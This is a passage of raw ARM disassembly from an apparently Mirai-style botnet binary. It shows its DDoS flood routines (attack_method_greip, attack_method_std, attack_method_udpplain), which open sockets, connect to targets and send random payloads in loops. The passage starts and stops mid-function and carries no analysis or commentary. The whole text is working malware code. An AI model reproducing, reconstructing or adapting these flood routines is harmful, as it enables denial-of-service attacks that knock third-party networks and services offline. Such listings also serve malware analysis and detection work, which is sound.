    dda8:	e2403ffa 	sub	r3, r0, #1000	; 0x3e8
    ddac:	e1e03003 	mvn	r3, r3
    ddb0:	e1520004 	cmp	r2, r4
    ddb4:	e1c500b4 	strh	r0, [r5, #4]
    ddb8:	e1c630b4 	strh	r3, [r6, #4]
    ddbc:	1affffa1 	bne	dc48 <attack_method_greip+0x420>
    ddc0:	eb001196 	bl	12420 <rand_next>
    ddc4:	e59d3038 	ldr	r3, [sp, #56]	; 0x38
    ddc8:	e1530004 	cmp	r3, r4
    ddcc:	e1c502bc 	strh	r0, [r5, #44]	; 0x2c
    ddd0:	1affff9f 	bne	dc54 <attack_method_greip+0x42c>
    ddd4:	eb001191 	bl	12420 <rand_next>
    ddd8:	e59d4044 	ldr	r4, [sp, #68]	; 0x44
    dddc:	e3540000 	cmp	r4, #0
    dde0:	15953010 	ldrne	r3, [r5, #16]
    dde4:	e1c700b2 	strh	r0, [r7, #2]
    dde8:	15863010 	strne	r3, [r6, #16]
    ddec:	1affff9d 	bne	dc68 <attack_method_greip+0x440>
    ddf0:	eb00118a 	bl	12420 <rand_next>
    ddf4:	e59d1040 	ldr	r1, [sp, #64]	; 0x40
    ddf8:	e3510000 	cmp	r1, #0
    ddfc:	e5860010 	str	r0, [r6, #16]
    de00:	0affff9b 	beq	dc74 <attack_method_greip+0x44c>
    de04:	e2870008 	add	r0, r7, #8
    de08:	e59d103c 	ldr	r1, [sp, #60]	; 0x3c
    de0c:	eb0011b4 	bl	124e4 <rand_str>
    de10:	eaffff97 	b	dc74 <attack_method_greip+0x44c>
    de14:	e59d0024 	ldr	r0, [sp, #36]	; 0x24
    de18:	eb0035b4 	bl	1b4f0 <__GI___libc_close>
    de1c:	e28dd064 	add	sp, sp, #100	; 0x64
    de20:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    de24:	e12fff1e 	bx	lr
    de28:	e59d103c 	ldr	r1, [sp, #60]	; 0x3c
    de2c:	e59d203c 	ldr	r2, [sp, #60]	; 0x3c
    de30:	e2811008 	add	r1, r1, #8
    de34:	e2828034 	add	r8, r2, #52	; 0x34
    de38:	e58d100c 	str	r1, [sp, #12]
    de3c:	eaffff68 	b	dbe4 <attack_method_greip+0x3bc>
    de40:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000de44 <attack_method_std>:
    de44:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    de48:	e24dd02c 	sub	sp, sp, #44	; 0x2c
    de4c:	e58d1004 	str	r1, [sp, #4]
    de50:	e3a01004 	mov	r1, #4
    de54:	e1a05002 	mov	r5, r2
    de58:	e1a06003 	mov	r6, r3
    de5c:	e1a07000 	mov	r7, r0
    de60:	eb002e91 	bl	198ac <calloc>
    de64:	e3a01004 	mov	r1, #4
    de68:	e1a0a000 	mov	sl, r0
    de6c:	e1a00007 	mov	r0, r7
    de70:	eb002e8d 	bl	198ac <calloc>
    de74:	e3a04801 	mov	r4, #65536	; 0x10000
    de78:	e2444001 	sub	r4, r4, #1
    de7c:	e1a01006 	mov	r1, r6
    de80:	e3a02007 	mov	r2, #7
    de84:	e1a03004 	mov	r3, r4
    de88:	e1a08000 	mov	r8, r0
    de8c:	e1a00005 	mov	r0, r5
    de90:	ebfff1a2 	bl	a520 <attack_get_opt_int>
    de94:	e1a0c800 	lsl	ip, r0, #16
    de98:	e1a0c82c 	lsr	ip, ip, #16
    de9c:	e1a01006 	mov	r1, r6
    dea0:	e3a02006 	mov	r2, #6
    dea4:	e1a03004 	mov	r3, r4
    dea8:	e1a00005 	mov	r0, r5
    deac:	e58dc008 	str	ip, [sp, #8]
    deb0:	ebfff19a 	bl	a520 <attack_get_opt_int>
    deb4:	e1a01006 	mov	r1, r6
    deb8:	e1a09800 	lsl	r9, r0, #16
    debc:	e3a02000 	mov	r2, #0
    dec0:	e3a03b01 	mov	r3, #1024	; 0x400
    dec4:	e1a00005 	mov	r0, r5
    dec8:	ebfff194 	bl	a520 <attack_get_opt_int>
    decc:	e3a02001 	mov	r2, #1
    ded0:	e1a03002 	mov	r3, r2
    ded4:	e1a0c800 	lsl	ip, r0, #16
    ded8:	e1a01006 	mov	r1, r6
    dedc:	e1a00005 	mov	r0, r5
    dee0:	e1a0582c 	lsr	r5, ip, #16
    dee4:	ebfff18d 	bl	a520 <attack_get_opt_int>
    dee8:	e1a06829 	lsr	r6, r9, #16
    deec:	e3a03000 	mov	r3, #0
    def0:	e1560004 	cmp	r6, r4
    def4:	120620ff 	andne	r2, r6, #255	; 0xff
    def8:	e58d3024 	str	r3, [sp, #36]	; 0x24
    defc:	e58d3018 	str	r3, [sp, #24]
    df00:	e58d301c 	str	r3, [sp, #28]
    df04:	e58d3020 	str	r3, [sp, #32]
    df08:	11a03c29 	lsrne	r3, r9, #24
    df0c:	e20000ff 	and	r0, r0, #255	; 0xff
    df10:	11832402 	orrne	r2, r3, r2, lsl #8
    df14:	e58d0010 	str	r0, [sp, #16]
    df18:	158d200c 	strne	r2, [sp, #12]
    df1c:	1a000003 	bne	df30 <attack_method_std+0xec>
    df20:	eb00113e 	bl	12420 <rand_next>
    df24:	e1a00800 	lsl	r0, r0, #16
    df28:	e1a00820 	lsr	r0, r0, #16
    df2c:	e58d000c 	str	r0, [sp, #12]
    df30:	e3570000 	cmp	r7, #0
    df34:	0a00004d 	beq	e070 <attack_method_std+0x22c>
    df38:	e3a09000 	mov	r9, #0
    df3c:	e1a0b009 	mov	fp, r9
    df40:	e58d9014 	str	r9, [sp, #20]
    df44:	ea00001f 	b	dfc8 <attack_method_std+0x184>
    df48:	e3a00002 	mov	r0, #2
    df4c:	e1a01000 	mov	r1, r0
    df50:	e3a02000 	mov	r2, #0
    df54:	eb002b72 	bl	18d24 <__GI_socket>
    df58:	e59dc014 	ldr	ip, [sp, #20]
    df5c:	e3700001 	cmn	r0, #1
    df60:	e2899001 	add	r9, r9, #1
    df64:	e28bb018 	add	fp, fp, #24
    df68:	e28d1018 	add	r1, sp, #24
    df6c:	e3a02010 	mov	r2, #16
    df70:	e78c0008 	str	r0, [ip, r8]
    df74:	0a00003a 	beq	e064 <attack_method_std+0x220>
    df78:	e3a03000 	mov	r3, #0
    df7c:	e59dc00c 	ldr	ip, [sp, #12]
    df80:	e58d301c 	str	r3, [sp, #28]
    df84:	e3a03002 	mov	r3, #2
    df88:	e1cd31b8 	strh	r3, [sp, #24]
    df8c:	e1cdc1ba 	strh	ip, [sp, #26]
    df90:	eb002a1c 	bl	18808 <__GI_bind>
    df94:	e5d63014 	ldrb	r3, [r6, #20]
    df98:	e353001f 	cmp	r3, #31
    df9c:	9a00001e 	bls	e01c <attack_method_std+0x1d8>
    dfa0:	e59d2014 	ldr	r2, [sp, #20]
    dfa4:	e1a01006 	mov	r1, r6
    dfa8:	e7920008 	ldr	r0, [r2, r8]
    dfac:	e3a02010 	mov	r2, #16
    dfb0:	eb002a36 	bl	18890 <__libc_connect>
    dfb4:	e59d3014 	ldr	r3, [sp, #20]
    dfb8:	e1590007 	cmp	r9, r7
    dfbc:	e2833004 	add	r3, r3, #4
    dfc0:	e58d3014 	str	r3, [sp, #20]
    dfc4:	0a000029 	beq	e070 <attack_method_std+0x22c>
    dfc8:	e3a04801 	mov	r4, #65536	; 0x10000
    dfcc:	e2444001 	sub	r4, r4, #1
    dfd0:	e3a01001 	mov	r1, #1
    dfd4:	e1a00004 	mov	r0, r4
    dfd8:	eb002e33 	bl	198ac <calloc>
    dfdc:	e59d1008 	ldr	r1, [sp, #8]
    dfe0:	e20120ff 	and	r2, r1, #255	; 0xff
    dfe4:	e1a03421 	lsr	r3, r1, #8
    dfe8:	e1833402 	orr	r3, r3, r2, lsl #8
    dfec:	e59d2004 	ldr	r2, [sp, #4]
    dff0:	e59dc014 	ldr	ip, [sp, #20]
    dff4:	e1510004 	cmp	r1, r4
    dff8:	e082600b 	add	r6, r2, fp
    dffc:	e78c000a 	str	r0, [ip, sl]
    e000:	11c630b2 	strhne	r3, [r6, #2]
    e004:	1affffcf 	bne	df48 <attack_method_std+0x104>
    e008:	eb001104 	bl	12420 <rand_next>
    e00c:	e59d1004 	ldr	r1, [sp, #4]
    e010:	e08b6001 	add	r6, fp, r1
    e014:	e1c600b2 	strh	r0, [r6, #2]
    e018:	eaffffca 	b	df48 <attack_method_std+0x104>
    e01c:	e5964010 	ldr	r4, [r6, #16]
    e020:	eb0010fe 	bl	12420 <rand_next>
    e024:	e20418ff 	and	r1, r4, #16711680	; 0xff0000
    e028:	e1a02c24 	lsr	r2, r4, #24
    e02c:	e1822421 	orr	r2, r2, r1, lsr #8
    e030:	e2043cff 	and	r3, r4, #65280	; 0xff00
    e034:	e1822403 	orr	r2, r2, r3, lsl #8
    e038:	e5d61014 	ldrb	r1, [r6, #20]
    e03c:	e1822c04 	orr	r2, r2, r4, lsl #24
    e040:	e0822130 	add	r2, r2, r0, lsr r1
    e044:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    e048:	e1a03c22 	lsr	r3, r2, #24
    e04c:	e1833420 	orr	r3, r3, r0, lsr #8
    e050:	e2021cff 	and	r1, r2, #65280	; 0xff00
    e054:	e1833401 	orr	r3, r3, r1, lsl #8
    e058:	e1833c02 	orr	r3, r3, r2, lsl #24
    e05c:	e5863004 	str	r3, [r6, #4]
    e060:	eaffffce 	b	dfa0 <attack_method_std+0x15c>
    e064:	e28dd02c 	add	sp, sp, #44	; 0x2c
    e068:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    e06c:	e12fff1e 	bx	lr
    e070:	e59dc010 	ldr	ip, [sp, #16]
    e074:	e35c0000 	cmp	ip, #0
    e078:	1a00000b 	bne	e0ac <attack_method_std+0x268>
    e07c:	e59d4010 	ldr	r4, [sp, #16]
    e080:	ea000003 	b	e094 <attack_method_std+0x250>
    e084:	e7980104 	ldr	r0, [r8, r4, lsl #2]
    e088:	e79a1104 	ldr	r1, [sl, r4, lsl #2]
    e08c:	eb002ac1 	bl	18b98 <__libc_send>
    e090:	e2844001 	add	r4, r4, #1
    e094:	e1570004 	cmp	r7, r4
    e098:	e1a02005 	mov	r2, r5
    e09c:	e3a03901 	mov	r3, #16384	; 0x4000
    e0a0:	cafffff7 	bgt	e084 <attack_method_std+0x240>
    e0a4:	e3a04000 	mov	r4, #0
    e0a8:	eafffff9 	b	e094 <attack_method_std+0x250>
    e0ac:	e3a06000 	mov	r6, #0
    e0b0:	e1560007 	cmp	r6, r7
    e0b4:	e1a01005 	mov	r1, r5
    e0b8:	aafffffb 	bge	e0ac <attack_method_std+0x268>
    e0bc:	e79a4106 	ldr	r4, [sl, r6, lsl #2]
    e0c0:	e1a00004 	mov	r0, r4
    e0c4:	eb001106 	bl	124e4 <rand_str>
    e0c8:	e7980106 	ldr	r0, [r8, r6, lsl #2]
    e0cc:	e1a01004 	mov	r1, r4
    e0d0:	e1a02005 	mov	r2, r5
    e0d4:	e3a03901 	mov	r3, #16384	; 0x4000
    e0d8:	eb002aae 	bl	18b98 <__libc_send>
    e0dc:	e2866001 	add	r6, r6, #1
    e0e0:	eafffff2 	b	e0b0 <attack_method_std+0x26c>

0000e0e4 <attack_method_udpplain>:
    e0e4:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    e0e8:	e24dd02c 	sub	sp, sp, #44	; 0x2c
    e0ec:	e58d1004 	str	r1, [sp, #4]
    e0f0:	e3a01004 	mov	r1, #4
    e0f4:	e1a05002 	mov	r5, r2
    e0f8:	e1a06003 	mov	r6, r3
    e0fc:	e1a07000 	mov	r7, r0
    e100:	eb002de9 	bl	198ac <calloc>
    e104:	e3a01004 	mov	r1, #4
    e108:	e1a0a000 	mov	sl, r0
    e10c:	e1a00007 	mov	r0, r7
    e110:	eb002de5 	bl	198ac <calloc>
    e114:	e3a04801 	mov	r4, #65536	; 0x10000
    e118:	e2444001 	sub	r4, r4, #1
    e11c:	e1a01006 	mov	r1, r6
    e120:	e3a02007 	mov	r2, #7
    e124:	e1a03004 	mov	r3, r4
    e128:	e1a08000 	mov	r8, r0
    e12c:	e1a00005 	mov	r0, r5
    e130:	ebfff0fa 	bl	a520 <attack_get_opt_int>
    e134:	e1a0c800 	lsl	ip, r0, #16
    e138:	e1a0c82c 	lsr	ip, ip, #16
    e13c:	e1a01006 	mov	r1, r6
    e140:	e3a02006 	mov	r2, #6
    e144:	e1a03004 	mov	r3, r4
    e148:	e1a00005 	mov	r0, r5
    e14c:	e58dc008 	str	ip, [sp, #8]
    e150:	ebfff0f2 	bl	a520 <attack_get_opt_int>
    e154:	e1a01006 	mov	r1, r6
    e158:	e1a09800 	lsl	r9, r0, #16
    e15c:	e3a02000 	mov	r2, #0
    e160:	e3a03a01 	mov	r3, #4096	; 0x1000
    e164:	e1a00005 	mov	r0, r5
    e168:	ebfff0ec 	bl	a520 <attack_get_opt_int>
    e16c:	e3a02001 	mov	r2, #1
    e170:	e1a03002 	mov	r3, r2
    e174:	e1a0c800 	lsl	ip, r0, #16
    e178:	e1a01006 	mov	r1, r6
    e17c:	e1a00005 	mov	r0, r5
    e180:	e1a0582c 	lsr	r5, ip, #16
    e184:	ebfff0e5 	bl	a520 <attack_get_opt_int>
    e188:	e1a06829 	lsr	r6, r9, #16
    e18c:	e3a03000 	mov	r3, #0
    e190:	e1560004 	cmp	r6, r4
    e194:	120620ff 	andne	r2, r6, #255	; 0xff
    e198:	e58d3024 	str	r3, [sp, #36]	; 0x24
    e19c:	e58d3018 	str	r3, [sp, #24]
    e1a0:	e58d301c 	str	r3, [sp, #28]
    e1a4:	e58d3020 	str	r3, [sp, #32]
    e1a8:	11a03c29 	lsrne	r3, r9, #24
    e1ac:	e20000ff 	and	r0, r0, #255	; 0xff
    e1b0:	11832402 	orrne	r2, r3, r2, lsl #8
    e1b4:	e58d0010 	str	r0, [sp, #16]
    e1b8:	158d200c 	strne	r2, [sp, #12]
    e1bc:	1a000003 	bne	e1d0 <attack_method_udpplain+0xec>
    e1c0:	eb001096 	bl	12420 <rand_next>
    e1c4:	e1a00800 	lsl	r0, r0, #16
    e1c8:	e1a00820 	lsr	r0, r0, #16
    e1cc:	e58d000c 	str	r0, [sp, #12]
    e1d0:	e3570000 	cmp	r7, #0
    e1d4:	0a00004d 	beq	e310 <attack_method_udpplain+0x22c>
    e1d8:	e3a09000 	mov	r9, #0
    e1dc:	e1a0b009 	mov	fp, r9
    e1e0:	e58d9014 	str	r9, [sp, #20]
    e1e4:	ea00001f 	b	e268 <attack_method_udpplain+0x184>
    e1e8:	e3a00002 	mov	r0, #2
    e1ec:	e1a01000 	mov	r1, r0
    e1f0:	e3a02011 	mov	r2, #17
    e1f4:	eb002aca 	bl	18d24 <__GI_socket>
    e1f8:	e59dc014 	ldr	ip, [sp, #20]
    e1fc:	e3700001 	cmn	r0, #1
    e200:	e2899001 	add	r9, r9, #1
    e204:	e28bb018 	add	fp, fp, #24
    e208:	e28d1018 	add	r1, sp, #24
    e20c:	e3a02010 	mov	r2, #16
    e210:	e78c0008 	str	r0, [ip, r8]
    e214:	0a00003a 	beq	e304 <attack_method_udpplain+0x220>
    e218:	e3a03000 	mov	r3, #0
    e21c:	e59dc00c 	ldr	ip, [sp, #12]
    e220:	e58d301c 	str	r3, [sp, #28]
    e224:	e3a03002 	mov	r3, #2
    e228:	e1cd31b8 	strh	r3, [sp, #24]
    e22c:	e1cdc1ba 	strh	ip, [sp, #26]
    e230:	eb002974 	bl	18808 <__GI_bind>
    e234:	e5d63014 	ldrb	r3, [r6, #20]
    e238:	e353001f 	cmp	r3, #31
    e23c:	9a00001e 	bls	e2bc <attack_method_udpplain+0x1d8>
    e240:	e59d2014 	ldr	r2, [sp, #20]
    e244:	e1a01006 	mov	r1, r6
    e248:	e7920008 	ldr	r0, [r2, r8]
    e24c:	e3a02010 	mov	r2, #16
    e250:	eb00298e 	bl	18890 <__libc_connect>
    e254:	e59d3014 	ldr	r3, [sp, #20]
    e258:	e1590007 	cmp	r9, r7
    e25c:	e2833004 	add	r3, r3, #4
    e260:	e58d3014 	str	r3, [sp, #20]
    e264:	0a000029 	beq	e310 <attack_method_udpplain+0x22c>
    e268:	e3a04801 	mov	r4, #65536	; 0x10000
    e26c:	e2444001 	sub	r4, r4, #1
    e270:	e3a01001 	mov	r1, #1
    e274:	e1a00004 	mov	r0, r4
    e278:	eb002d8b 	bl	198ac <calloc>
    e27c:	e59d1008 	ldr	r1, [sp, #8]
    e280:	e20120ff 	and	r2, r1, #255	; 0xff
    e284:	e1a03421 	lsr	r3, r1, #8
    e288:	e1833402 	orr	r3, r3, r2, lsl #8
    e28c:	e59d2004 	ldr	r2, [sp, #4]
    e290:	e59dc014 	ldr	ip, [sp, #20]
    e294:	e1510004 	cmp	r1, r4
    e298:	e082600b 	add	r6, r2, fp
    e29c:	e78c000a 	str	r0, [ip, sl]
    e2a0:	11c630b2 	strhne	r3, [r6, #2]
    e2a4:	1affffcf 	bne	e1e8 <attack_method_udpplain+0x104>
    e2a8:	eb00105c 	bl	12420 <rand_next>
    e2ac:	e59d1004 	ldr	r1, [sp, #4]
